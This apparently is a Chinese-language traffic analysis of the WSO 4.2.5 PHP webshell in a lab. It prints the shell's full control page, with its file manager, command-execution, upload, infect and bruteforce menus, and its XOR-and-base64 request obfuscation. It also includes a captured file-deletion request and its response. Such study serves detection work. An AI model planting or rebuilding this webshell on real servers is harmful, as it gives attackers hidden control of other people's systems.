					var reg = new RegExp("(\\d+)([\\S\\s]*)", 'm');
					var arr=reg.exec(req.responseText);
					eval(arr[2].substr(0, arr[1]));
				} else alert('Request error!');
		}
	</script>
	<head><body><div style='position:absolute;background-color:rgba(95, 110, 130, 0.3);width:100%;top:0;left:0;'>
	<form method=post name=mf style='display:none;'>
	<input type=hidden name=a>
	<input type=hidden name=c>
	<input type=hidden name=p1>
	<input type=hidden name=p2>
	<input type=hidden name=p3>
	<input type=hidden name=charset>
	</form><table class=info cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span>Uname:<br>User:<br>Php:<br>Hdd:<br>Cwd:</span></td><td><nobr>Linux ubuntu 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:16:20 UTC 2015 x86_64 <a href="http://noreferer.de/?http://www.google.com/search?q=Linux+ubuntu+3.19.0-25-generic+%2326%7E14.04.1-Ubuntu+SMP+Fri+Jul+24+21%3A16%3A20+UTC+2015+x86_64" target="_blank">[ Google ]</a> <a href="http://noreferer.de/?http://www.exploit-db.com/search/?action=search&description=Linux+Kernel+3.19.0" target=_blank>[ Exploit-DB ]</a></nobr><br>33 ( www-data ) <span>Group:</span> 33 ( www-data )<br>5.5.9-1ubuntu4.19 <span>Safe mode:</span> <font color=#FFDB5F><b>OFF</b></font> <a href=# onclick="g('Php',null,null,'info')">[ phpinfo ]</a> <span>Datetime:</span> 2016-11-03 20:16:14<br>18.58 GB <span>Free:</span> 13.12 GB (70.62%)<br><a href='#' onclick='g("FilesMan","/")'>/</a><a href='#' onclick='g("FilesMan","/var/")'>var/</a><a href='#' onclick='g("FilesMan","/var/www/")'>www/</a><a href='#' onclick='g("FilesMan","/var/www/html/")'>html/</a><a href='#' onclick='g("FilesMan","/var/www/html/webshell-master/")'>webshell-master/</a><a href='#' onclick='g("FilesMan","/var/www/html/webshell-master/php/")'>php/</a><a href='#' onclick='g("FilesMan","/var/www/html/webshell-master/php/wso/")'>wso/</a> <font color=#FFDB5F><b>drwxrwxrwx</b></font> <a href=# onclick="g('FilesMan','/var/www/html/webshell-master/php/wso','','','')">[ home ]</a><br></td><td width=1 align=right><nobr><label><select onchange="g(null,null,null,null,null,this.value)"><option value="UTF-8" selected>UTF-8</option><option value="Windows-1251" >Windows-1251</option><option value="KOI8-R" >KOI8-R</option><option value="KOI8-U" >KOI8-U</option><option value="cp866" >cp866</option></select></label><br><span>Server IP:</span><br>192.168.182.143<br><span>Client IP:</span><br>192.168.182.1</nobr></td></tr></table><table style="background-color:#2E6E9C;" cellpadding=3 cellspacing=0 width=100%><tr><th>[ <a href="#" onclick="g('SecInfo',null,'','','')">Sec. Info</a> ]</th><th>[ <a href="#" onclick="g('FilesMan',null,'','','')">Files</a> ]</th><th>[ <a href="#" onclick="g('Console',null,'','','')">Console</a> ]</th><th>[ <a href="#" onclick="g('Infect',null,'','','')">Infect</a> ]</th><th>[ <a href="#" onclick="g('Sql',null,'','','')">Sql</a> ]</th><th>[ <a href="#" onclick="g('Php',null,'','','')">Php</a> ]</th><th>[ <a href="#" onclick="g('SafeMode',null,'','','')">Safe mode</a> ]</th><th>[ <a href="#" onclick="g('StringTools',null,'','','')">String tools</a> ]</th><th>[ <a href="#" onclick="g('Bruteforce',null,'','','')">Bruteforce</a> ]</th><th>[ <a href="#" onclick="g('Network',null,'','','')">Network</a> ]</th><th>[ <a href="#" onclick="g('Logout',null,'','','')">Logout</a> ]</th><th>[ <a href="#" onclick="g('SelfRemove',null,'','','')">Self remove</a> ]</th></tr></table><div><h1>File manager</h1><div class=content><script>p1_=p2_=p3_="";</script><script>
		function sa() {
			for(i=0;i<d.files.elements.length;i++)
				if(d.files.elements[i].type == 'checkbox')
					d.files.elements[i].checked = d.files.elements[0].checked;
		}
	</script>
	<table width='100%' class='main' cellspacing='0' cellpadding='2'>
	<form name=files method=post><tr><th width='13px'><input type=checkbox onclick='sa()' class=chkbx></th><th><a href='#' onclick='g("FilesMan",null,"s_name_0")'>Name</a></th><th><a href='#' onclick='g("FilesMan",null,"s_size_0")'>Size</a></th><th><a href='#' onclick='g("FilesMan",null,"s_modify_0")'>Modify</a></th><th>Owner/Group</th><th><a href='#' onclick='g("FilesMan",null,"s_perms_0")'>Permissions</a></th><th>Actions</th></tr><tr><td><input type=checkbox name="f[]" value=".." class=chkbx></td><td><a href=# onclick="g('FilesMan','/var/www/html/webshell-master/php/wso/..');" ><b>[ .. ]</b></a></td><td>dir</td><td>2016-10-07 01:08:54</td><td>root/root</td><td><a href=# onclick="g('FilesTools',null,'..','chmod')"><font color=white><b>drwxr-xr-x</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'..', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'..', 'touch')">T</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value="readme.md" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'readme.md', 'view')">readme.md</a></td><td>1.73 KB</td><td>2016-10-07 01:08:54</td><td>root/root</td><td><a href=# onclick="g('FilesTools',null,'readme.md','chmod')"><font color=white><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'readme.md', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'readme.md', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'readme.md', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'readme.md', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'readme.md', 'download')">D</a></td></tr><tr><td><input type=checkbox name="f[]" value="wso-4.1.3.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'wso-4.1.3.php', 'view')">wso-4.1.3.php</a></td><td>75.76 KB</td><td>2016-10-07 01:08:54</td><td>root/root</td><td><a href=# onclick="g('FilesTools',null,'wso-4.1.3.php','chmod')"><font color=white><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'wso-4.1.3.php', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'wso-4.1.3.php', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'wso-4.1.3.php', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'wso-4.1.3.php', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'wso-4.1.3.php', 'download')">D</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value="wso-4.2.0.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'wso-4.2.0.php', 'view')">wso-4.2.0.php</a></td><td>86.53 KB</td><td>2016-10-07 01:08:54</td><td>root/root</td><td><a href=# onclick="g('FilesTools',null,'wso-4.2.0.php','chmod')"><font color=white><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'wso-4.2.0.php', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'wso-4.2.0.php', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'wso-4.2.0.php', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'wso-4.2.0.php', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'wso-4.2.0.php', 'download')">D</a></td></tr><tr><td><input type=checkbox name="f[]" value="wso-4.2.1.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'wso-4.2.1.php', 'view')">wso-4.2.1.php</a></td><td>75.72 KB</td><td>2016-10-07 01:08:54</td><td>root/root</td><td><a href=# onclick="g('FilesTools',null,'wso-4.2.1.php','chmod')"><font color=white><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'wso-4.2.1.php', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'wso-4.2.1.php', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'wso-4.2.1.php', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'wso-4.2.1.php', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'wso-4.2.1.php', 'download')">D</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value="wso-4.2.2.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'wso-4.2.2.php', 'view')">wso-4.2.2.php</a></td><td>75.71 KB</td><td>2016-10-07 01:08:54</td><td>root/root</td><td><a href=# onclick="g('FilesTools',null,'wso-4.2.2.php','chmod')"><font color=white><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'wso-4.2.2.php', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'wso-4.2.2.php', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'wso-4.2.2.php', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'wso-4.2.2.php', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'wso-4.2.2.php', 'download')">D</a></td></tr><tr><td><input type=checkbox name="f[]" value="wso-4.2.3.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'wso-4.2.3.php', 'view')">wso-4.2.3.php</a></td><td>76.26 KB</td><td>2016-10-07 01:08:54</td><td>root/root</td><td><a href=# onclick="g('FilesTools',null,'wso-4.2.3.php','chmod')"><font color=white><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'wso-4.2.3.php', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'wso-4.2.3.php', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'wso-4.2.3.php', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'wso-4.2.3.php', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'wso-4.2.3.php', 'download')">D</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value="wso-4.2.4.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'wso-4.2.4.php', 'view')">wso-4.2.4.php</a></td><td>76.41 KB</td><td>2016-10-07 01:08:54</td><td>root/root</td><td><a href=# onclick="g('FilesTools',null,'wso-4.2.4.php','chmod')"><font color=white><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'wso-4.2.4.php', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'wso-4.2.4.php', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'wso-4.2.4.php', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'wso-4.2.4.php', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'wso-4.2.4.php', 'download')">D</a></td></tr><tr><td><input type=checkbox name="f[]" value="wso-4.2.5.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'wso-4.2.5.php', 'view')">wso-4.2.5.php</a></td><td>77.86 KB</td><td>2016-10-07 01:08:54</td><td>root/root</td><td><a href=# onclick="g('FilesTools',null,'wso-4.2.5.php','chmod')"><font color=white><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'wso-4.2.5.php', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'wso-4.2.5.php', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'wso-4.2.5.php', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'wso-4.2.5.php', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'wso-4.2.5.php', 'download')">D</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value="wso.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'wso.php', 'view')">wso.php</a></td><td>61.58 KB</td><td>2016-10-07 01:08:54</td><td>root/root</td><td><a href=# onclick="g('FilesTools',null,'wso.php','chmod')"><font color=white><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'wso.php', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'wso.php', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'wso.php', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'wso.php', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'wso.php', 'download')">D</a></td></tr><tr><td><input type=checkbox name="f[]" value="wso2.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'wso2.php', 'view')">wso2.php</a></td><td>64.56 KB</td><td>2016-10-07 01:08:54</td><td>root/root</td><td><a href=# onclick="g('FilesTools',null,'wso2.php','chmod')"><font color=white><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'wso2.php', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'wso2.php', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'wso2.php', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'wso2.php', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'wso2.php', 'download')">D</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value="wso2_pack.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'wso2_pack.php', 'view')">wso2_pack.php</a></td><td>24.17 KB</td><td>2016-10-07 01:08:54</td><td>root/root</td><td><a href=# onclick="g('FilesTools',null,'wso2_pack.php','chmod')"><font color=white><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'wso2_pack.php', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'wso2_pack.php', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'wso2_pack.php', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'wso2_pack.php', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'wso2_pack.php', 'download')">D</a></td></tr><tr><td><input type=checkbox name="f[]" value="wso_404.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'wso_404.php', 'view')">wso_404.php</a></td><td>105.04 KB</td><td>2016-11-03 17:58:16</td><td>root/root</td><td><a href=# onclick="g('FilesTools',null,'wso_404.php','chmod')"><font color=white><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'wso_404.php', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'wso_404.php', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'wso_404.php', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'wso_404.php', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'wso_404.php', 'download')">D</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value="WSO_4_0_5.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'WSO_4_0_5.php', 'view')">WSO_4_0_5.php</a></td><td>67.72 KB</td><td>2016-10-07 01:08:54</td><td>root/root</td><td><a href=# onclick="g('FilesTools',null,'WSO_4_0_5.php','chmod')"><font color=white><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'WSO_4_0_5.php', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'WSO_4_0_5.php', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'WSO_4_0_5.php', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'WSO_4_0_5.php', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'WSO_4_0_5.php', 'download')">D</a></td></tr><tr><td><input type=checkbox name="f[]" value="WSO_base64.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'WSO_base64.php', 'view')">WSO_base64.php</a></td><td>82.16 KB</td><td>2016-10-07 01:08:54</td><td>root/root</td><td><a href=# onclick="g('FilesTools',null,'WSO_base64.php','chmod')"><font color=white><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'WSO_base64.php', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'WSO_base64.php', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'WSO_base64.php', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'WSO_base64.php', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'WSO_base64.php', 'download')">D</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value="yaofeitest.md" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'yaofeitest.md', 'view')">yaofeitest.md</a></td><td>1.46 KB</td><td>2016-11-01 01:58:39</td><td>www-data/www-data</td><td><a href=# onclick="g('FilesTools',null,'yaofeitest.md','chmod')"><font color=#FFDB5F><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'yaofeitest.md', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'yaofeitest.md', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'yaofeitest.md', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'yaofeitest.md', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'yaofeitest.md', 'download')">D</a></td></tr><tr id=fak><td colspan=7>
		<input type=hidden name=ne value=''>
		<input type=hidden name=a value='FilesMan'>
		<input type=hidden name=c value='/var/www/html/webshell-master/php/wso/'>
		<input type=hidden name=charset value='UTF-8'>
		<label><select name='p1'><option value='copy'>Copy</option><option value='move'>Move</option><option value='delete'>Delete</option><option value='zip'>+ zip</option><option value='unzip'>- zip</option><option value='tar'>+ tar.gz</option></select></label><input type='submit' value='submit'></td></tr></form></table></div>
	</div>
	<table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%>
		<tr>
			<td><form onsubmit="g(null,this.c.value,'');return false;"><span>Change dir:</span><br><input class='toolsInp' type=text name=c value='/var/www/html/webshell-master/php/wso/'><input type=submit value='submit'></form></td>
			<td><form onsubmit="g('FilesTools',null,this.f.value);return false;"><span>Read file:</span><br><input class='toolsInp' type=text name=f required><input type=submit value='submit'></form></td>
		</tr><tr>
			<td><form onsubmit="g('FilesMan',null,'mkdir',this.d.value);return false;"><span>Make dir:</span> <font color='#FFDB5F'>[ Writeable ]</font><br><input class='toolsInp' type=text name=d required><input type=submit value='submit'></form></td>
			<td><form onsubmit="g('FilesTools',null,this.f.value,'mkfile');return false;"><span>Make file:</span> <font color='#FFDB5F'>[ Writeable ]</font><br><input class='toolsInp' type=text name=f required><input type=submit value='submit'></form></td>
		</tr><tr>
			<td><form onsubmit="g('Console',null,this.c.value);return false;"><span>Execute:</span><br><input class='toolsInp' type=text name=c value=''><input type=submit value='submit'></form></td>
			<td><form method='post' ENCTYPE='multipart/form-data'>
			<input type=hidden name=a value='FilesMan'>
			<input type=hidden name=c value='/var/www/html/webshell-master/php/wso/'>
			<input type=hidden name=p1 value='uploadFile'>
			<input type=hidden name=ne value=''>
			<input type=hidden name=charset value='UTF-8'>
			<span>Upload file:</span> <font color='#FFDB5F'>[ Writeable ]</font><br><input class='toolsInp' type=file name=f[]  multiple><input type=submit value='submit'></form><br  ></td>
		</tr></table></div>
		<!-- particles --> <div id='particles-js'></div><script src='http://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js'></script>
		<script>particlesJS('particles-js', {'particles':{'number':{'value':80,'density':{'enable':true,'value_area':800}},'color':{'value':'#ffffff'},'shape':{'type':'triangle','stroke':{'width':0,'color':'#000000'},'polygon':{'nb_sides':5},'image':{'src':'img/github.svg','width':100,'height':100}},'opacity':{'value':0.5,'random':true,'anim':{'enable':false,'speed':1,'opacity_min':0.1,'sync':false}},'size':{'value':3,'random':true,'anim':{'enable':false,'speed':40,'size_min':0.1,'sync':false}},'line_linked':{'enable':true,'distance':200,'color':'#ffffff','opacity':0.4,'width':1},'move':{'enable':true,'speed':1,'direction':'none','random':true,'straight':false,'out_mode':'out','bounce':false,'attract':{'enable':false,'rotateX':10000,'rotateY':10000}}},'interactivity':{'detect_on':'canvas','events':{'onhover':{'enable':true,'mode':'grab'},'onclick':{'enable':true,'mode':'repulse'},'resize':true},'modes':{'grab':{'distance':200,'line_linked':{'opacity':0.5}},'bubble':{'particles_nb':2}}},'retina_detect':true});</script>
		</body></html>

##### 4.2.1.2&emsp;数据包分析 #####
>数据包攻击载荷：<font color=red>a=CCk1RgMPC34XLVxV&c=FncDXTo%2BfAMqSQseLzIYGDtxaEkDAyFPOD01QDsUaEYDNQBdFDUAQy4TC0oWdz1POy59DQ%3D%3D&p1=&p2=&p3=&charset=UTF-8</font>

>请求数据包具体分析如4.1.2分析操作相同，通过解密函数得到a="FilesMan",c="/var/www/html/webshell-master/php/wso/",通过对wso4.2.5源码进行分析：

	if( empty($_POST['a']) )
		if(isset($▚) && function_exists('action' . $▚))
			$_POST['a'] = $▚;
		else
			$_POST['a'] = 'FilesMan';
>action的默认值为"FilesMan"。

>响应包内容分析：该操作响应包返回依然为整个html页面。

>具体信息如图4.2.1.1所示：<br>![wso_shell]({{ site.baseurl }}/images/wso_shell/Files.png)<br><center>图4.2.1.1</center>

#### 4.2.2&emsp;文件基本操作（文件的增删改查） ####
&emsp;&emsp;&emsp;从Files一级菜单或者webshell的底下操作栏中对单个文件进行增删改查等操作。
##### 4.2.2.1&emsp;数据包内容 #####
(删除文件操作)
**请求数据包**
<br>

	POST /webshell-master/php/wso/wso-4.2.5.php HTTP/1.1
	Host: 192.168.182.143
	Connection: keep-alive
	Content-Length: 115
	Cache-Control: max-age=0
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
	Origin: http://192.168.182.143
	Upgrade-Insecure-Requests: 1
	User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36
	Content-Type: application/x-www-form-urlencoded
	Referer: http://192.168.182.143/webshell-master/php/wso/wso-4.2.5.php
	Accept-Encoding: gzip, deflate
	Accept-Language: zh-CN,zh;q=0.8
	Cookie: da94407ecf64bda7c0ac6ea1fa4477d8stderr_to_out=1; da94407ecf64bda7c0ac6ea1fa4477d8key=d69aa478a72ecd3a99c77af6fcf6b917; da94407ecf64bda7c0ac6ea1fa4477d8=21232f297a57a5a743894a0e4a801fc3; da94407ecf64bda7c0ac6ea1fa4477d8ajax=0; PHPSESSID=mh6l96lmrd0so2isi315c3loi4
	
	f%5B%5D=yaofeitest.md&ne=&a=FilesMan&c=%2Fvar%2Fwww%2Fhtml%2Fwebshell-master%2Fphp%2Fwso%2F&charset=UTF-8&p1=delete

**响应数据包**
<br>

	HTTP/1.1 200 OK
	Date: Fri, 04 Nov 2016 05:45:53 GMT
	Server: Apache/2.4.7 (Ubuntu)
	X-Powered-By: PHP/5.5.9-1ubuntu4.19
	Vary: Accept-Encoding
	Content-Encoding: gzip
	Content-Length: 3622
	Keep-Alive: timeout=5, max=100
	Connection: Keep-Alive
	Content-Type: text/html

	<html><head><meta http-equiv='Content-Type' content='text/html; charset=UTF-8'><title>192.168.182.143 - WSO 4.2.5</title>
	<style>
		body {background-color:#060A10; color:#e1e1e1; margin:0; font:normal 75% Arial, Helvetica, sans-serif; } canvas{ display: block; vertical-align: bottom;}
		#particles-js{width: 100%; height: 100px; background-color: #060a10; background-image: url(''); background-repeat: no-repeat; background-size: cover; background-position: 50% 50%;}
		body,td,th	{font:10pt tahoma,arial,verdana,sans-serif,Lucida Sans;margin:0;vertical-align:top;}
		table.info	{color:#C3C3C3;}
		table#toolsTbl {background-color: #060A10;}
		span,h1,a	{color:#fff !important;}
		span		{font-weight:bolder;}
		h1			{border-left:5px solid #2E6E9C;padding:2px 5px;font:14pt Verdana;background-color:#10151c;margin:0px;}
		div.content	{padding:5px;margin-left:5px;background-color:#060a10;}
		a			{text-decoration:none;}
		a:hover		{text-decoration:underline;}
		.tooltip::after {background:#0663D5;color:#FFF;content: attr(data-tooltip);margin-top:-50px;display:block;padding:6px 10px;position:absolute;visibility:hidden;}
		.tooltip:hover::after {opacity:1;visibility:visible;}
		.ml1		{border:1px solid #202832;padding:5px;margin:0;overflow:auto;}
		.bigarea	{min-width:100%;max-width:100%;height:400px;}
		input, textarea, select	{margin:0;color:#fff;background-color:#202832;border:none;font:9pt Courier New;outline:none;}
		label {position:relative}
		label:after {content:'<>';font:10px 'Consolas', monospace;color:#fff;-webkit-transform:rotate(90deg);-moz-transform:rotate(90deg);-ms-transform:rotate(90deg);transform:rotate(90deg);right:3px; top:3px;padding:0;position:absolute;pointer-events:none;}
		label:before {content:'';right:0; top:0;width:17px; height:17px;background:#202832;position:absolute;pointer-events:none;display:block;}
		form		{margin:0px;}
		#toolsTbl	{text-align:center;}
		#fak 		{background:none;}
		#fak td 	{padding:5px 0 0 0;}
		iframe		{border:1px solid #060a10;}
		.toolsInp	{width:300px}
		.main th	{text-align:left;background-color:#060a10;}
		.main tr:hover{background-color:#354252;}
		.main td, th{vertical-align:middle;}
		input[type='submit']{background-color:#2E6E9C;}
		input[type='button']{background-color:#2E6E9C;}
		input[type='submit']:hover{background-color:#56AD15;}
		input[type='button']:hover{background-color:#56AD15;}
		.l1			{background-color:#202832;}
		pre			{font:9pt Courier New;}
	</style>
	<script>
	    var c_ = '/var/www/html/webshell-master/php/wso/';
	    var a_ = 'FilesMan'
	    var charset_ = 'UTF-8';
	    var p1_ = 'delete';
	    var p2_ = '';
	    var p3_ = '';
	    var d = document;
		
		function encrypt(str,pwd){if(pwd==null||pwd.length<=0){return null;}str=base64_encode(str);pwd=base64_encode(pwd);var enc_chr='';var enc_str='';var i=0;while(i<str.length){for(var j=0;j<pwd.length;j++){enc_chr=str.charCodeAt(i)^pwd.charCodeAt(j);enc_str+=String.fromCharCode(enc_chr);i++;if(i>=str.length)break;}}return base64_encode(enc_str);}
		function utf8_encode(argString){var string=(argString+'');var utftext='',start,end,stringl=0;start=end=0;stringl=string.length;for(var n=0;n<stringl;n++){var c1=string.charCodeAt(n);var enc=null;if(c1<128){end++;}else if(c1>127&&c1<2048){enc=String.fromCharCode((c1>>6)|192)+String.fromCharCode((c1&63)|128);}else{enc=String.fromCharCode((c1>>12)|224)+String.fromCharCode(((c1>>6)&63)|128)+String.fromCharCode((c1&63)|128);}if(enc!==null){if(end>start){utftext+=string.slice(start,end);}utftext+=enc;start=end=n+1;}}if(end>start){utftext+=string.slice(start,stringl);}return utftext;}
		function base64_encode(data){var b64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';var o1,o2,o3,h1,h2,h3,h4,bits,i=0,ac=0,enc='',tmp_arr=[];if (!data){return data;}data=utf8_encode(data+'');do{o1=data.charCodeAt(i++);o2=data.charCodeAt(i++);o3=data.charCodeAt(i++);bits=o1<<16|o2<<8|o3;h1=bits>>18&0x3f;h2=bits>>12&0x3f;h3=bits>>6&0x3f;h4=bits&0x3f;tmp_arr[ac++]=b64.charAt(h1)+b64.charAt(h2)+b64.charAt(h3)+b64.charAt(h4);}while(i<data.length);enc=tmp_arr.join('');switch (data.length%3){case 1:enc=enc.slice(0,-2)+'==';break;case 2:enc=enc.slice(0,-1)+'=';break;}return enc;}
		function set(a,c,p1,p2,p3,charset) {
			if(a!=null)d.mf.a.value=a;else d.mf.a.value=a_;
			if(c!=null)d.mf.c.value=c;else d.mf.c.value=c_;
			if(p1!=null)d.mf.p1.value=p1;else d.mf.p1.value=p1_;
			if(p2!=null)d.mf.p2.value=p2;else d.mf.p2.value=p2_;
			if(p3!=null)d.mf.p3.value=p3;else d.mf.p3.value=p3_;
			d.mf.a.value = encrypt(d.mf.a.value,'d69aa478a72ecd3a99c77af6fcf6b917');
			d.mf.c.value = encrypt(d.mf.c.value,'d69aa478a72ecd3a99c77af6fcf6b917');
